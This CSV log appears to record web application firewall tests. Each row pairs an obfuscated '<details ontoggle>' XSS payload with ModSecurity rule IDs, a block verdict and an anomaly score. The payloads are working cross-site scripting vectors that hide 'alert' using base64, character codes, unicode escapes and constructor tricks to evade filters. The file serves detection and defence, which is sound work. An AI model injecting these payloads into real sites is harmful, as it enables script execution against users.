299,"<details open ontoggle=""(function(){var s=globalThis[atob('YWxlcnQ')];s(1);})();"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826431783.353000
300,"<details open ontoggle=""(function(){var t=frames[0]?.[String.fromCodePoint(0x61,0x6c,0x65,0x72,0x74)]??window[String.fromCodePoint(0x61,0x6c,0x65,0x72,0x74)];t(1);})();"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,170 || v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o103,54v217,170t:urlDecodeUni,t:compressWhitespace || ",20,177826431935.692462
301,"<details open ontoggle=""(function(){var u=[97,108,101,114,116]['map'](x=>String['fromCodePoint'](x))['join']('');window[u](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o62,68v217,133t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,133 || v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o113,9v217,133t:urlDecodeUni,t:compressWhitespace || ",25,177826432123.224459
302,"<details open ontoggle=""(function(){var b=String.fromCharCode(97,108,101,114,116);self[b](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o86,11v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,7v217,100t:urlDecodeUni,t:compressWhitespace || ",25,177826432358.714561
303,"<details open ontoggle=""(function(){var c=['ale','rt'].join('');top[c](1);})();"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o63,4v217,81 || o67,11v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,6v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177826432511.805963
304,"<details open ontoggle=""(function(){var d=atob('YWxlcnQ=');parent[d](1);})();"">",0,1,block,5,"933210,934100,941100,941120,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826432724.850547
305,"<details open ontoggle=""(function(){var e=atob('YWxlcnQ=');frames[0]?.[e]&&frames[0][e](1)||globalThis[e](1);})();"">",0,1,block,5,"933210,934100,941100,941120,949110","o81,32v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826432988.159692
307,"<details open ontoggle=""(function(){var g=atob('YWxlcnQ=');(1,self[g])(1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o66,12v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,7v217,81t:urlDecodeUni,t:compressWhitespace || ",25,177826433348.070533
308,"<details open ontoggle=""(function(){var h=['a','l','e','r','t'];top[h.join('')](1);})();"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o63,4v217,90 || o67,20v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,15v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177826433646.757874
309,"<details open ontoggle=""(function(){var i='\u0061\u006c\u0065\u0072\u0074';parent[i](1);})();"">",0,1,block,5,"933210,934100,941100,941120,949110","o81,11v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826433841.578166
310,"<details open ontoggle=""(function(){var j=atob('YWxlcnQ=');Reflect.get(self,j)(1);})();"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826434014.017022
311,"<details open ontoggle=""(function(){var k=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);self[k](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o92,11v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,7v217,106t:urlDecodeUni,t:compressWhitespace || ",25,177826434322.003945
312,"<details open ontoggle=""(function(){var l=atob('YWxlcnQ=');globalThis[l]`1`;})();"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826434581.873061
313,"<details open ontoggle=""(function(){var m=atob('YWxlcnQ=');Reflect.apply(self[m],null,[1]);})();"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o73,7v217,98t:urlDecodeUni,t:compressWhitespace || ",20,177826434764.322127
314,"<details open ontoggle=""(function(){var n=['al','ert'].join('');(0,globalThis[n])(1);})();"">",0,1,block,5,"933210,934100,941100,941120,949110","o77,12v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826434931.249147
315,"<details open ontoggle=""(function(){var o=String.fromCharCode(97)+String.fromCharCode(108,101,114,116);self[o](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o107,11v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,121 || o25,11v217,121t:urlDecodeUni || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o103,7v217,121t:urlDecodeUni,t:compressWhitespace || ",30,177826435179.395539
316,"<details open ontoggle=""(function(){var p=atob('YWxlcnQ=');setTimeout(self[p],0,1);})();"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o70,7v217,90t:urlDecodeUni,t:compressWhitespace || ",20,177826435363.951929
320,"<details open ontoggle=""(function(){var t=atob('YWxlcnQ=');({}).constructor.constructor(t+'(1)')();})();"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o59,44v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,106 || o25,11v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782643610.554192
321,"<details open ontoggle=""(function(){var u=atob('YWxlcnQ=');[].map.constructor(u+'(1)')();})();"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o59,34v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,96 || o25,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826436435.908774
322,"<details open ontoggle=""(function(){var e=atob('YWxlcnQ=');window[e](7);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,11v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,88t:urlDecodeUni,t:compressWhitespace || ",25,177826436622.795688
324,"<details open ontoggle=""(function(){var e=String['\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065'](97,108,101,114,116);window[e](7);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o151,11v217,174t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,174 || v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o145,9v217,174t:urlDecodeUni,t:compressWhitespace || ",25,177826437032.302624
326,"<details open ontoggle=""(function(){var e=String.fromCharCode(97,108,101,114,116);globalThis[e](7);})()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o92,11v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826437411.778866
328,"<details open ontoggle=""(function(){var e=String.fromCharCode(97,108,101,114,116);parent[e](7);})()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o88,11v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782643786.743461
330,"<details open ontoggle=""(function(){var e=[97,108,101,114,116];var f='';for(var i=0;i<e.length;i++){f+=String.fromCharCode(e[i]);}window[f](7);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o135,11v217,159t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,159 || o25,11v217,159t:urlDecodeUni || v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o129,9v217,159t:urlDecodeUni,t:compressWhitespace || ",30,177826438281.632562
332,"<details open ontoggle=""(function(){var e='\u0061\u006c\u0065\u0072\u0074';window[e](7);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o81,11v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o75,9v217,104t:urlDecodeUni,t:compressWhitespace || ",25,17782643865.691922
333,"<details open ontoggle=""(function(){var e=String['fromC'+'harCode'](97,108,101,114,116);window[e](7);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,57v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,117 || o25,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,117t:urlDecodeUni,t:compressWhitespace || ",30,177826438880.904418
334,"<details open ontoggle=""(function(){var e=String['from'+'Char'+'Code'](0x61,0x6c,0x65,0x72,0x74);window[e](7);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,66v217,126t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,126 || o25,11v217,126t:urlDecodeUni || v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o97,9v217,126t:urlDecodeUni,t:compressWhitespace || ",30,177826439026.485125
335,"<details open ontoggle=""(function(){var e=String[`fromCharCode`](97,108,101,114,116);window[e](7);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o91,11v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,114t:urlDecodeUni,t:compressWhitespace || ",25,177826439296.031560
336,"<details open ontoggle=""(function(){var e=Object['\x63onstructor']['\x63onstructor']('return\x20ale'+'rt')();e(7);})()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,130 || o25,11v217,130t:urlDecodeUni || v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826439448.421332
337,"<details open ontoggle=""(function(){var e=Array.prototype.map.call([97,108,101,114,116],function(c){return String.fromCharCode(c)}).join('');window[e](7);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o147,11v217,170t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,170 || v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o141,9v217,170t:urlDecodeUni,t:compressWhitespace || ",25,177826439644.534876
338,"<details open ontoggle=""(function(){var e=String.fromCharCode(...[97,108,101,114,116]);window[e](7);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o93,11v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o87,9v217,116t:urlDecodeUni,t:compressWhitespace || ",25,177826439842.176774
339,"<details open ontoggle=""(function(){var e=[].constructor['\x63onstructor']('return\x20ale'+'rt')();e(7);})()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,120 || o25,11v217,120t:urlDecodeUni || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782644001.173718
340,"<details open ontoggle=""(function(){var e=decodeURI('%61%6c%65%72%74');window[e](7);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o67,11v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || o25,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,100t:urlDecodeUni,t:compressWhitespace || ",30,17782644036.598856
341,"<details open ontoggle=""(function(){var e=unescape('%61%6c%65%72%74');window[e](7);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o66,11v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || o25,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,99t:urlDecodeUni,t:compressWhitespace || ",30,177826440517.665458
342,"<details open ontoggle=""(function(){var j=self['\u0053\u0074\u0072\u0069\u006e\u0067']['\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065'](97,108,101,114,116);self[j](14);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o187,12v217,211t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,211 || v217,211t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,211t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,44v217,211t:urlDecodeUni,t:compressWhitespace || ",25,17782644079.520613
343,"<details open ontoggle=""(function(){var j=[]['constructor']['constructor']('\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0061\u006c\u0065\u0072\u0074')();j(14);})()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o42,121v217,175t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,175 || v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826440926.294335
344,"<details open ontoggle=""(function(){var j=top['String']['fromCharCode'](97,108,101,114,116);top[j](14);})()""></details>",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o91,4v217,119 || o45,62v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,119 || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,13v217,119t:urlDecodeUni,t:compressWhitespace || ",30,177826441173.187192
345,"<details open ontoggle=""(function(){var j=parent.String.fromCharCode(97,108,101,114,116);parent[j](14);})()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o95,12v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,119 || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826441393.189726
347,"<details open ontoggle=""(function(){var j=atob('YWxlcnQ');self[j](14);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o62,12v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,7v217,86t:urlDecodeUni,t:compressWhitespace || ",25,177826441748.994278
348,"<details open ontoggle=""(function(){var j=unescape('%61%6c%65%72%74');self[j](14);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o64,12v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,98 || o25,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,7v217,98t:urlDecodeUni,t:compressWhitespace || ",30,177826441971.403607
349,"<details open ontoggle=""(function(){var j=decodeURI('%61%6c%65%72%74');self[j](14);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,12v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || o25,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,7v217,99t:urlDecodeUni,t:compressWhitespace || ",30,177826442288.331481
350,"<details open ontoggle=""(function(){var j='al'+'ert';self[j](14);})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o57,12v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,7v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177826442478.635161
351,"<details open ontoggle=""(function(){var j=['a','l','e','r','t']['join']('');self[j](14);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o63,29v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o76,7v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177826442644.653559
359,"<details open ontoggle=""(function(){var j=(1,eval)('String').fromCharCode(97,108,101,114,116);(1,eval)('self')[j](14);})()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o102,20v217,134t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,134 || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826444323.754232
360,"<details open ontoggle=""(function(){var j=Reflect.get(String,'fromCharCode')(97,108,101,114,116);Reflect.get(self,j)(14);})()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,11v217,137 || v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826444555.170317
361,"<details open ontoggle=""(function(){var j=Array.from([97,108,101,114,116],x=>String.fromCodePoint(x)).join('');self[j](14);})()""></details>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o115,12v217,139t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o111,7v217,139t:urlDecodeUni,t:compressWhitespace || ",25,177826444711.502088
362,"<details open ontoggle=""(function(){var x=[97,108,101,114,116];window[x.map(c=>String.fromCodePoint(c)).join([])](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o99,22v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,123 || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o63,48v217,123t:urlDecodeUni,t:compressWhitespace || ",25,177826445056.483888
363,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ=');window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177826445220.285066
365,"<details open ontoggle=""(function(){var x=String['fromCharCode'](97,108,101,114,116);window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,54v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177826445658.728175
366,"<details open ontoggle=""(function(){var x=String['fromC'+'harCode'](97,108,101,114,116);window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,57v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || o25,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,107t:urlDecodeUni,t:compressWhitespace || ",30,177826445812.444673
370,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);self[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o86,11v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,7v217,99t:urlDecodeUni,t:compressWhitespace || ",25,177826446614.833003
